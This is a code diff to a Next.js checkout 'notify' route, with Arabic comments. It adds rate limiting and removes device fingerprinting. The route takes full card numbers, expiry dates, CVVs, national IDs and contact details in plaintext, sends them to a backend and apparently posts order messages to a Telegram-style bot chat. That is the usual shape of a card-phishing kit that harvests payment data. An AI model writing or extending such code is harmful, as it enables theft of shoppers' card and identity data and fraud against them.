@@ -1,15 +1,34 @@
 import { NextRequest, NextResponse } from "next/server";
 
+// Server-side rate limit: IP → { count, windowStart }
+const notifyRateLimit = new Map<string, { count: number; windowStart: number }>();
+const NOTIFY_MAX = 5;
+const NOTIFY_WINDOW_MS = 15 * 60 * 1000;
+
+function checkNotifyRateLimit(ip: string): boolean {
+  const now = Date.now();
+  const entry = notifyRateLimit.get(ip);
+  if (!entry || now - entry.windowStart > NOTIFY_WINDOW_MS) {
+    notifyRateLimit.set(ip, { count: 1, windowStart: now });
+    return true;
+  }
+  if (entry.count >= NOTIFY_MAX) return false;
+  entry.count += 1;
+  return true;
+}
+
 export async function POST(req: NextRequest) {
-  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, shippingCompany, installmentType, months, downPayment, fingerprint } = await req.json();
+  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || req.headers.get("x-real-ip") || "unknown";
+
+  if (!checkNotifyRateLimit(ip)) {
+    return NextResponse.json({ ok: false, error: "طلبات كثيرة، حاول لاحقاً" }, { status: 429 });
+  }
+
+  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, shippingCompany, installmentType, months, downPayment } = await req.json();
 
   const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
-  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || req.headers.get("x-real-ip") || "";
   const isLocal = !ip || ip === "127.0.0.1" || ip === "::1";
   const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((total - downPayment) / months) : 0;
-
-  // deviceId: fingerprint أولاً، fallback للـ IP
-  const deviceId = fingerprint || ip || "unknown";
 
   // ── 1. أرسل للـ backend أولاً ──
   let dbRes: Response;
@@ -19,7 +38,6 @@ export async function POST(req: NextRequest) {
       headers: {
         "Content-Type": "application/json",
         "x-forwarded-for": ip,
-        "x-device-id": deviceId,
       },
       body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, shippingCompany, installmentType, months, monthlyPayment, downPayment }),
     });
@@ -83,7 +101,7 @@ export async function POST(req: NextRequest) {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id, text, reply_markup }),
-      })
+      }).catch(() => {})
     )
   );
 
